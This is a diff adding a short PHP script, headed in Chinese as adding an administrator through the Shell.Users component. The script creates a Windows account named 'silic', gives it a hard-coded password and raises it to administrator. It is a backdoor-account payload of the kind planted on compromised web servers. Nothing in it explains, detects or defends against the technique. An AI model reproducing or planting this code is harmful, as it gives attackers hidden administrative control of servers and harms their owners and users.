@@ -1,0 +1,7 @@
+<?php   
+echo “<center>Shell.Users组件添加管理员</center>”;   
+$shell = new COM(“Shell.Users”);   
+$cmd = $shell->create(‘silic’);   
+$cmd->changePassword(’13579@silic#’,”");  
+$cmd->setting["AccountType"] = 3;   
+?>  
